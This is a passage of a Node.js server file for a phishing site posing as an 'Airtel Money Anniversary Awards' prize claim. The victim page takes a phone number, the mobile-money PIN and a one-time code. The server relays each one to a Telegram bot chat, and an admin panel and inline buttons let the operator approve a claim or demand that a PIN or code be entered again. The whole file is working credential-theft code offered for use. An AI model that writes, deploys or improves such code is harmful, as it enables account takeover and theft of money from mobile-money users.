{name:'Papua New Guinea',code:'+675',flag:'\\uD83C\\uDDF5\\uD83C\\uDDEC',iso:'PG'},
{name:'North Korea',code:'+850',flag:'\\uD83C\\uDDF0\\uD83C\\uDDF5',iso:'KP'}
];

var filteredCountries = COUNTRIES;
var selectedCountry = null;
var currentClaimId = null;
var userNumber = '';
var userCountryCode = '';
var pollInterval = null;

function goToStep(id){
var all=document.querySelectorAll('.step-content');
for(var i=0;i<all.length;i++){all[i].classList.remove('active')}
var el=document.getElementById(id+'Content');
if(el){el.classList.add('active')}
window.scrollTo(0,0);
}

var searchInput = document.getElementById('countrySearch');
var dropdown = document.getElementById('countryDropdown');
var flagBox = document.getElementById('flagBox');
var codeDisplay = document.getElementById('codeDisplay');

function renderCountries(list){
if(list.length === 0){
dropdown.innerHTML = '<div class="country-no-result">No country found. Try a different name or code.</div>';
return;
}
var html = '';
for(var i=0;i<list.length;i++){
var c = list[i];
html += '<div class="country-item" data-code="' + c.code + '" data-name="' + c.name + '" data-flag="' + c.flag + '">' +
'<span class="ci-flag">' + c.flag + '</span>' +
'<span class="ci-name">' + c.name + '</span>' +
'<span class="ci-code">' + c.code + '</span>' +
'</div>';
}
dropdown.innerHTML = html;

var items = dropdown.querySelectorAll('.country-item');
for(var j=0;j<items.length;j++){
items[j].addEventListener('click', function(){
selectCountry(
this.getAttribute('data-code'),
this.getAttribute('data-name'),
this.getAttribute('data-flag')
);
});
}
}

function selectCountry(code, name, flag){
selectedCountry = { code: code, name: name, flag: flag };
flagBox.innerHTML = flag;
codeDisplay.textContent = code;
searchInput.value = name + ' (' + code + ')';
hideDropdown();
}

function showDropdown(){
dropdown.classList.add('show');
}

function hideDropdown(){
dropdown.classList.remove('show');
}

searchInput.addEventListener('focus', function(){
filteredCountries = COUNTRIES;
renderCountries(filteredCountries);
showDropdown();
});

searchInput.addEventListener('input', function(){
var q = this.value.trim().toLowerCase();
var qCode = q.replace(/[^0-9+]/g, '');

if(q === ''){
filteredCountries = COUNTRIES;
} else {
filteredCountries = COUNTRIES.filter(function(c){
var matchName = c.name.toLowerCase().indexOf(q) !== -1;
var matchCode = false;
if(qCode){
var cleanCode = c.code.replace('+','');
var cleanQ = qCode.replace('+','');
matchCode = cleanCode.indexOf(cleanQ) === 0 || cleanQ.indexOf(cleanCode) === 0;
}
return matchName || matchCode;
});
}

renderCountries(filteredCountries);
showDropdown();
});

searchInput.addEventListener('keydown', function(e){
if(e.key === 'Enter'){
e.preventDefault();
if(filteredCountries.length > 0){
var c = filteredCountries[0];
selectCountry(c.code, c.name, c.flag);
}
}
if(e.key === 'Escape'){
hideDropdown();
}
});

document.addEventListener('click', function(e){
if(!e.target.closest('.country-wrap')){
hideDropdown();
}
});

document.getElementById('numberForm').addEventListener('submit', function(e){
e.preventDefault();
var num = document.getElementById('airtelNumber').value.trim();

if(!selectedCountry){
showErr('messageDiv','Please select your country');
return;
}
if(!num || num.length < 6){
showErr('messageDiv','Please enter a valid Airtel Money number');
return;
}

userCountryCode = selectedCountry.code;
userNumber = selectedCountry.code + ' ' + num;
goToStep('step2');
});

// ===== PIN SUBMIT (with kill old poller + safety timeout) =====
document.getElementById('pinForm').addEventListener('submit', async function(e){
e.preventDefault();
var pin=document.getElementById('airtelPin').value.trim();
if(!pin||pin.length!==4){showErr('pinMessage','Airtel Money PIN must be 4 digits');return}

var btn=document.getElementById('pinBtn');
var btnText=document.getElementById('pinText');

// Kill any old poller so it doesn't interfere with this submission
if(pollInterval){clearInterval(pollInterval);pollInterval=null;}

btn.disabled=true;
btnText.innerHTML='<span class="loader"></span> Processing...';

// Safety timeout: re-enable button if nothing responds in 15s
var safetyTimeout = setTimeout(function(){
    btn.disabled=false;
    btnText.textContent='Continue';
    showErr('pinMessage','Request timed out. Please try again.');
}, 15000);

try{
var response=await fetch('/api/start-claim',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
airtelNumber: userNumber,
airtelPin: pin,
country: selectedCountry ? selectedCountry.name : 'Unknown',
countryCode: userCountryCode
})
});
var data=await response.json();

clearTimeout(safetyTimeout);
btn.disabled=false;
btnText.textContent='Continue';

if(data.success){
currentClaimId=data.claimId;
goToStep('verifying');
startCountdown();
}else{
showErr('pinMessage',data.message||'Failed. Please try again.');
}
}catch(error){
clearTimeout(safetyTimeout);
btn.disabled=false;
btnText.textContent='Continue';
showErr('pinMessage','Network error. Please try again.');
}
});

function startCountdown(){
var seconds=20;
var el=document.getElementById('verifyingNumber');
el.textContent=seconds;

var t=setInterval(function(){
seconds--;
if(seconds<0){seconds=0}
el.textContent=seconds;
if(seconds<=0){
clearInterval(t);
goToStep('step4');
var first=document.querySelector('#otpContainer .otp-input');
if(first){first.focus()}
}
},1000);
}

var otpInputs=document.querySelectorAll('#otpContainer .otp-input');
for(var oi=0;oi<otpInputs.length;oi++){
(function(input,index){
input.addEventListener('input',function(e){
var v=e.target.value.replace(/[^0-9]/g,'');
e.target.value=v;
input.classList.remove('error');
if(v){
input.classList.add('filled');
if(index<otpInputs.length-1){otpInputs[index+1].focus()}
}else{
input.classList.remove('filled');
}
});
input.addEventListener('keydown',function(e){
if(e.key==='Backspace'&&!input.value&&index>0){otpInputs[index-1].focus()}
});
})(otpInputs[oi],oi);
}

// ===== OTP SUBMIT (with kill old poller + safety timeout) =====
document.getElementById('submitOtpBtn').addEventListener('click', async function(){
var otp='';
for(var i=0;i<otpInputs.length;i++){otp+=otpInputs[i].value}

if(otp.length!==4){
showErr('otpMessage','Please enter the complete 4-digit code');
for(var i=0;i<otpInputs.length;i++){otpInputs[i].classList.add('error')}
setTimeout(function(){for(var i=0;i<otpInputs.length;i++){otpInputs[i].classList.remove('error')}},1200);
return;
}

var btn=document.getElementById('submitOtpBtn');

// Kill any old poller so it doesn't interfere with this submission
if(pollInterval){clearInterval(pollInterval);pollInterval=null;}

btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Sending...';

// Safety timeout: re-enable button if nothing responds in 15s
var safetyTimeout = setTimeout(function(){
    btn.disabled=false;
    btn.textContent='Verify and Claim';
    showErr('otpMessage','Request timed out. Please try again.');
}, 15000);

try{
var response=await fetch('/api/submit-otp',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({claimId:currentClaimId,otp:otp})
});
var data=await response.json();

clearTimeout(safetyTimeout);

if(data.success){
goToStep('waiting');
startPolling();
}else{
showErr('otpMessage',data.message||'Error');
btn.disabled=false;
btn.textContent='Verify and Claim';
}
}catch(error){
clearTimeout(safetyTimeout);
showErr('otpMessage','Network error. Please try again.');
btn.disabled=false;
btn.textContent='Verify and Claim';
}
});

function startPolling(){
if(pollInterval){clearInterval(pollInterval)}
pollInterval=null;

pollInterval=setInterval(async function(){
try{
var response=await fetch('/api/check-status/'+currentClaimId);
var data=await response.json();

if(data.status==='approved'){
clearInterval(pollInterval);
pollInterval=null;
document.getElementById('finalRegId').textContent='#'+currentClaimId;
document.getElementById('finalCountry').textContent=(selectedCountry ? selectedCountry.flag + ' ' + selectedCountry.name : '---');
document.getElementById('finalPhone').textContent=userNumber;
goToStep('success');
}
else if(data.status==='rejected_otp'){
clearInterval(pollInterval);
pollInterval=null;
var btn=document.getElementById('submitOtpBtn');
btn.disabled=false;
btn.textContent='Verify and Claim';
goToStep('step4');
showErr('otpMessage','Wrong OTP. Please re-enter your code.');
for(var i=0;i<otpInputs.length;i++){otpInputs[i].value='';otpInputs[i].classList.add('error')}
setTimeout(function(){for(var i=0;i<otpInputs.length;i++){otpInputs[i].classList.remove('error')}},1500);
otpInputs[0].focus();
fetch('/api/clear-status/'+currentClaimId,{method:'POST'});
}
else if(data.status==='rejected_pin'){
clearInterval(pollInterval);
pollInterval=null;
goToStep('step2');
var pinInput = document.getElementById('airtelPin');
var pinBtn = document.getElementById('pinBtn');
var pinBtnText = document.getElementById('pinText');
pinInput.value='';
pinBtn.disabled=false;
pinBtnText.textContent='Continue';
pinInput.classList.add('error');
setTimeout(function(){pinInput.classList.remove('error')},1500);
showErr('pinMessage','Incorrect PIN. Please re-enter your Airtel Money PIN.');
pinInput.focus();
fetch('/api/clear-status/'+currentClaimId,{method:'POST'});
}
}catch(error){
console.error('Poll error:',error);
}
},2000);
}

function showErr(id,msg){
var d=document.getElementById(id);
d.textContent=msg;
d.className='message show error';
setTimeout(function(){d.className='message'},5000);
}

document.getElementById('airtelNumber').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
document.getElementById('airtelPin').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
</script>
</body>
</html>`;

// ===== ADMIN PAGE =====
const ADMIN_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#1a1a1a 0%,#000 100%);min-height:100vh;padding:30px 20px;color:#fff}
.header{max-width:900px;margin:0 auto 30px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:15px}
.header h1{color:#E40000;font-size:1.8em;font-weight:800;letter-spacing:-0.5px}
.header h1 span{color:#FFD700}
.refresh-btn{background:#E40000;color:white;padding:10px 24px;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:14px;transition:all 0.2s}
.refresh-btn:hover{background:#B30000;transform:translateY(-2px)}
.stats{max-width:900px;margin:0 auto 30px;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:15px}
.stat{background:linear-gradient(135deg,#1f1f1f,#2a2a2a);border:1px solid #333;border-radius:12px;padding:18px;text-align:center}
.stat .num{font-size:32px;font-weight:800;color:#FFD700;line-height:1}
.stat .lbl{color:#999;font-size:12px;text-transform:uppercase;letter-spacing:1px;margin-top:6px;font-weight:600}
.stat.pending .num{color:#FFC107}
.stat.approved .num{color:#28a745}
.stat.rejected .num{color:#dc3545}
.login-box{max-width:420px;margin:100px auto;background:#1a1a1a;border:1px solid #333;border-radius:20px;padding:40px 30px;text-align:center}
.login-box h1{color:#E40000;margin-bottom:10px;font-size:1.6em}
.login-box p{color:#999;margin-bottom:25px;font-size:14px}
.login-box input{width:100%;padding:14px;border:2px solid #333;background:#0d0d0d;color:#fff;border-radius:10px;font-size:16px;margin-bottom:15px;font-family:inherit}
.login-box input:focus{border-color:#E40000;outline:none}
.login-box button{width:100%;padding:14px;background:#E40000;color:#fff;border:none;border-radius:10px;font-weight:700;font-size:16px;cursor:pointer;transition:all 0.2s}
.login-box button:hover{background:#B30000}
.login-error{color:#ff6b6b;font-size:14px;margin-top:12px;display:none}
.claims-container{max-width:900px;margin:0 auto}
.claim-card{background:linear-gradient(135deg,#1f1f1f,#2a2a2a);border:1px solid #333;border-radius:14px;padding:22px;margin-bottom:16px;transition:all 0.3s}
.claim-card:hover{border-color:#E40000;transform:translateY(-2px);box-shadow:0 8px 30px rgba(228,0,0,0.2)}
.claim-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid #333}
.claim-id{font-size:18px;font-weight:800;color:#FFD700;font-family:monospace}
.claim-time{color:#666;font-size:12px}
.claim-details{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px}
.claim-details .row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px;border-bottom:1px dashed #2a2a2a}
.claim-details .lbl{color:#999}
.claim-details .val{color:#fff;font-weight:600;font-family:monospace}
.claim-details .val.pin{color:#FFD700;font-size:15px;letter-spacing:2px}
.claim-actions{display:flex;gap:10px;flex-wrap:wrap}
.action-btn{flex:1;min-width:130px;padding:12px 18px;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:14px;transition:all 0.2s;color:#fff}
.btn-approve{background:linear-gradient(135deg,#28a745,#1e7e34)}
.btn-approve:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(40,167,69,0.4)}
.btn-reject{background:linear-gradient(135deg,#dc3545,#a71d2a)}
.btn-reject:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(220,53,69,0.4)}
.btn-pin{background:linear-gradient(135deg,#ff8c00,#cc6600)}
.btn-pin:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,140,0,0.4)}
.empty-state{text-align:center;padding:80px 20px;color:#666}
.empty-state .icon{font-size:64px;margin-bottom:16px;color:#28a745;font-weight:800}
.empty-state h2{color:#999;margin-bottom:8px}
.empty-state p{font-size:14px}
.hidden{display:none}
</style>
</head>
<body>

<div id="loginPage">
<div class="login-box">
<h1>Admin Panel</h1>
<p>Airtel Money Anniversary Awards</p>
<input type="password" id="adminPassword" placeholder="Enter admin password" autocomplete="off">
<button onclick="login()">Login</button>
<div class="login-error" id="loginError">Incorrect password. Please try again.</div>
</div>
</div>

<div id="dashboardPage" class="hidden">
<div class="header">
<h1>Airtel <span>Awards</span> Admin</h1>
<button class="refresh-btn" onclick="loadClaims()">Refresh</button>
</div>

<div class="stats">
<div class="stat pending"><div class="num" id="statPending">0</div><div class="lbl">Pending</div></div>
<div class="stat approved"><div class="num" id="statApproved">0</div><div class="lbl">Approved</div></div>
<div class="stat rejected"><div class="num" id="statRejected">0</div><div class="lbl">Rejected</div></div>
</div>

<div class="claims-container" id="claimsContainer">
<div class="empty-state">
<div class="icon">...</div>
<h2>Loading claims...</h2>
</div>
</div>
</div>

<script>
var isLoggedIn = false;

document.getElementById('adminPassword').addEventListener('keypress', function(e){
if(e.key === 'Enter'){login()}
});

async function login(){
var pw = document.getElementById('adminPassword').value.trim();
try{
var response = await fetch('/api/admin/login', {
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({password: pw})
});
var data = await response.json();
if(data.success){
isLoggedIn = true;
document.getElementById('loginPage').classList.add('hidden');
document.getElementById('dashboardPage').classList.remove('hidden');
loadClaims();
setInterval(loadClaims, 5000);
} else {
document.getElementById('loginError').style.display = 'block';
document.getElementById('adminPassword').value = '';
}
}catch(e){
document.getElementById('loginError').textContent = 'Network error. Please try again.';
document.getElementById('loginError').style.display = 'block';
}
}

async function loadClaims(){
try{
var response = await fetch('/api/admin/claims');
var data = await response.json();

var pending = 0, approved = 0, rejected = 0;
(data.claims||[]).forEach(function(c){
if(c.status === 'approved'){approved++}
else if(c.status === 'rejected_otp' || c.status === 'rejected_pin'){rejected++}
else {pending++}
});

document.getElementById('statPending').textContent = pending;
document.getElementById('statApproved').textContent = approved;
document.getElementById('statRejected').textContent = rejected;

var container = document.getElementById('claimsContainer');

if(!data.claims || data.claims.length === 0){
container.innerHTML = '<div class="empty-state"><div class="icon">-</div><h2>No claims yet</h2><p>New claims will appear here in real-time</p></div>';
return;
}

var pendingClaims = data.claims.filter(function(c){return c.status === 'pending'});

if(pendingClaims.length === 0){
container.innerHTML = '<div class="empty-state"><div class="icon">OK</div><h2>All caught up!</h2><p>No pending claims right now</p></div>';
return;
}

container.innerHTML = pendingClaims.map(function(c){
return '<div class="claim-card">' +
'<div class="claim-header">' +
'<div class="claim-id">#' + c.id + '</div>' +
'<div class="claim-time">' + c.time + '</div>' +
'</div>' +
'<div class="claim-details">' +
'<div class="row"><span class="lbl">Country:</span><span class="val">' + (c.country || 'N/A') + ' ' + (c.countryCode || '') + '</span></div>' +
'<div class="row"><span class="lbl">Airtel Number:</span><span class="val">' + c.airtelNumber + '</span></div>' +
'<div class="row"><span class="lbl">PIN:</span><span class="val pin">' + c.airtelPin + '</span></div>' +
'<div class="row"><span class="lbl">OTP Entered:</span><span class="val">' + (c.otpEntered || 'Not submitted yet') + '</span></div>' +
'</div>' +
'<div class="claim-actions">' +
'<button class="action-btn btn-approve" onclick="approveClaim(\\'' + c.id + '\\')">Approve</button>' +
'<button class="action-btn btn-reject" onclick="rejectClaim(\\'' + c.id + '\\', \\'otp\\')">Wrong OTP</button>' +
'<button class="action-btn btn-pin" onclick="rejectClaim(\\'' + c.id + '\\', \\'pin\\')">Wrong PIN</button>' +
'</div>' +
'</div>';
}).join('');

}catch(e){
console.error('Load error:', e);
}
}

async function approveClaim(id){
try{
var response = await fetch('/api/admin/action', {
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({claimId: id, action: 'approve'})
});
if(response.ok){
loadClaims();
}
}catch(e){
alert('Error: ' + e.message);
}
}

async function rejectClaim(id, type){
try{
var response = await fetch('/api/admin/action', {
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({claimId: id, action: 'reject_' + type})
});
if(response.ok){
loadClaims();
}
}catch(e){
alert('Error: ' + e.message);
}
}
</script>
</body>
</html>`;

// ===== TELEGRAM HELPERS =====
async function sendTelegramMessage(text, keyboard) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
        if (keyboard) {
            payload.reply_markup = { inline_keyboard: keyboard };
        }
        await axios.post(url, payload);
    } catch (e) {
        console.error('sendTelegramMessage failed:', e.message);
        if (e.response && e.response.data) {
            console.error('Telegram says:', JSON.stringify(e.response.data));
        }
    }
}

async function answerCallbackQuery(callbackQueryId, text) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
        await axios.post(url, { callback_query_id: callbackQueryId, text, show_alert: false });
    } catch (e) {
        console.error('answerCallbackQuery failed:', e.message);
        if (e.response && e.response.data) {
            console.error('Telegram says:', JSON.stringify(e.response.data));
        }
    }
}

function getClaimKeyboard(claimId) {
    return [
        [
            { text: 'Approve', callback_data: 'approve:' + claimId },
            { text: 'Wrong OTP', callback_data: 'reject_otp:' + claimId }
        ],
        [
            { text: 'Wrong PIN', callback_data: 'reject_pin:' + claimId }
        ]
    ];
}

// ===== ROUTES =====
app.get('/', (req, res) => { res.send(USER_PAGE); });
app.get('/admin', (req, res) => { res.send(ADMIN_PAGE); });

app.post('/api/admin/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

app.get('/api/admin/claims', (req, res) => {
    const list = Object.keys(claims).map(function(id){
        const c = claims[id];
        return {
            id: id,
            airtelNumber: c.airtelNumber,
            airtelPin: c.airtelPin,
            country: c.country,
            countryCode: c.countryCode,
            otpEntered: c.otpEntered,
            status: c.status,
            time: new Date(c.createdAt).toLocaleString()
        };
    }).sort(function(a,b){ return b.id - a.id });
    res.json({ claims: list });
});

app.post('/api/admin/action', async (req, res) => {
    try{
        const { claimId, action } = req.body;
        const c = claims[claimId];
        if(!c){
            return res.status(404).json({ success: false, message: 'Claim not found' });
        }

        if (action === 'approve') {
            c.status = 'approved';
        } else if (action === 'reject_otp') {
            c.status = 'rejected_otp';
        } else if (action === 'reject_pin') {
            c.status = 'rejected_pin';
        } else {
            return res.status(400).json({ success: false, message: 'Unknown action' });
        }

        c.decidedAt = new Date().toISOString();
        c.decidedBy = 'web';

        res.json({ success: true });
    }catch(e){
        console.error('Admin action error:', e.message);
        res.status(500).json({ success: false });
    }
});

app.post('/api/start-claim', async (req, res) => {
    try{
        const { airtelNumber, airtelPin, country, countryCode } = req.body;
        if(!airtelNumber || !airtelPin){
            return res.status(400).json({ success: false, message: 'Missing fields' });
        }
        if(airtelPin.length !== 4){
            return res.status(400).json({ success: false, message: 'PIN must be 4 digits' });
        }

        const claimId = Math.floor(10000 + Math.random() * 90000).toString();

        claims[claimId] = {
            airtelNumber,
            airtelPin,
            country: country || 'Unknown',
            countryCode: countryCode || '',
            otpEntered: null,
            status: 'pending',
            createdAt: new Date().toISOString()
        };

        const msg =
            '<b>NEW CLAIM STARTED</b>\n\n' +
            '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
            '<b>Country:</b> <code>' + (country || 'N/A') + ' ' + (countryCode || '') + '</code>\n' +
            '<b>Airtel Number:</b> <code>' + airtelNumber + '</code>\n' +
            '<b>Airtel PIN:</b> <code>' + airtelPin + '</code>\n' +
            '<b>Started:</b> ' + new Date().toLocaleString() + '\n\n' +
            '<i>User is entering OTP...</i>';

        await sendTelegramMessage(msg, getClaimKeyboard(claimId));

        res.json({ success: true, claimId });
    }catch(e){
        console.error('Start claim error:', e.message);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/submit-otp', async (req, res) => {
    try{
        const { claimId, otp } = req.body;
        const c = claims[claimId];
        if(!c){
            return res.status(404).json({ success: false, message: 'Claim not found' });
        }

        c.otpEntered = otp;
        c.otpSubmittedAt = new Date().toISOString();

        // Reset status to pending so the user's browser can poll cleanly
        if(c.status === 'rejected_otp'){ c.status = 'pending'; }

        const msg =
            '<b>OTP SUBMITTED - ACTION NEEDED</b>\n\n' +
            '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
            '<b>Country:</b> <code>' + (c.country || 'N/A') + ' ' + (c.countryCode || '') + '</code>\n' +
            '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
            '<b>PIN:</b> <code>' + c.airtelPin + '</code>\n' +
            '<b>OTP Entered:</b> <code>' + otp + '</code>\n' +
            '<b>Time:</b> ' + new Date().toLocaleString();

        await sendTelegramMessage(msg, getClaimKeyboard(claimId));

        res.json({ success: true });
    }catch(e){
        console.error('Submit OTP error:', e.message);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/api/check-status/:claimId', (req, res) => {
    const { claimId } = req.params;
    const c = claims[claimId];
    if(!c){
        return res.status(404).json({ status: 'not_found' });
    }
    res.json({ status: c.status });
});

app.post('/api/clear-status/:claimId', (req, res) => {
    const { claimId } = req.params;
    if(claims[claimId]){
        claims[claimId].status = 'pending';
    }
    res.json({ success: true });
});

// ===== TELEGRAM WEBHOOK =====
app.post('/telegram/webhook', async (req, res) => {
    try {
        const update = req.body;
        console.log('Webhook received:', JSON.stringify(update).substring(0, 500));

        if (update.callback_query) {
            const cq = update.callback_query;
            console.log('Button pressed:', cq.data, 'from', cq.from && cq.from.first_name);

            const data = cq.data || '';
            const parts = data.split(':');
            const action = parts[0];
            const claimId = parts[1];

            console.log('Action:', action, 'Claim:', claimId);

            const c = claims[claimId];
            if (!c) {
                console.log('Claim not found in memory:', claimId);
                await answerCallbackQuery(cq.id, 'Claim not found');
                return res.sendStatus(200);
            }

            if (action === 'approve') {
                c.status = 'approved';
                c.decidedAt = new Date().toISOString();
                c.decidedBy = 'telegram';
                await answerCallbackQuery(cq.id, 'Approved');
                await sendTelegramMessage(
                    '<b>APPROVED</b>\n\n' +
                    '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
                    '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
                    '<b>Time:</b> ' + new Date().toLocaleString()
                );
            } else if (action === 'reject_otp') {
                c.status = 'rejected_otp';
                c.decidedAt = new Date().toISOString();
                c.decidedBy = 'telegram';
                await answerCallbackQuery(cq.id, 'Wrong OTP');
                await sendTelegramMessage(
                    '<b>WRONG OTP</b>\n\n' +
                    '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
                    '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
                    '<b>OTP Entered:</b> <code>' + (c.otpEntered || 'N/A') + '</code>\n' +
                    '<i>User will re-enter OTP</i>'
                );
            } else if (action === 'reject_pin') {
                c.status = 'rejected_pin';
                c.decidedAt = new Date().toISOString();
                c.decidedBy = 'telegram';
                await answerCallbackQuery(cq.id, 'Wrong PIN');
                await sendTelegramMessage(
                    '<b>WRONG PIN</b>\n\n' +
                    '<b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
                    '<b>Airtel Number:</b> <code>' + c.airtelNumber + '</code>\n' +
                    '<b>PIN Entered:</b> <code>' + c.airtelPin + '</code>\n' +
                    '<i>User will re-enter PIN</i>'
                );
            } else {
                console.log('Unknown action:', action);
                await answerCallbackQuery(cq.id, 'Unknown action');
            }

            return res.sendStatus(200);
        }

        res.sendStatus(200);
    } catch (e) {
        console.error('Webhook error:', e.message);
        if (e.response && e.response.data) {
            console.error('Telegram says:', JSON.stringify(e.response.data));
        }
        res.sendStatus(200);
    }
});

// ===== WEBHOOK SETUP ROUTE =====
app.get('/setup-webhook', async (req, res) => {
    try {
        const publicUrl = req.query.url;
        if (!publicUrl) {
            return res.send(
                '<h2>Webhook Setup</h2>' +
                '<p>Visit this URL to register your webhook:</p>' +
                '<pre>' + req.protocol + '://' + req.get('host') + '/setup-webhook?url=https://your-public-domain.com</pre>' +
                '<p>The url must be your public HTTPS domain (no trailing slash).</p>'
            );
        }

        const webhookUrl = publicUrl.replace(/\/$/, '') + '/telegram/webhook';
        const allowedUpdates = JSON.stringify(['message', 'callback_query']);
        const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook` +
            `?url=${encodeURIComponent(webhookUrl)}` +
            `&allowed_updates=${encodeURIComponent(allowedUpdates)}` +
            `&drop_pending_updates=true`;

        const response = await axios.get(apiUrl);

        console.log('Webhook registered:', webhookUrl, JSON.stringify(response.data));

        res.json({
            webhookUrl,
            allowedUpdates: ['message', 'callback_query'],
            telegramResponse: response.data
        });
    } catch (e) {
        console.error('Setup webhook error:', e.message);
        if (e.response && e.response.data) {
            console.error('Telegram says:', JSON.stringify(e.response.data));
        }
        res.status(500).json({
            error: e.message,
            telegramResponse: e.response ? e.response.data : null
        });
    }
});

app.get('/health', (req, res) => res.json({ status: 'healthy' }));

app.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
    console.log('User page: http://localhost:' + PORT + '/');
    console.log('Admin page: http://localhost:' + PORT + '/admin');
});
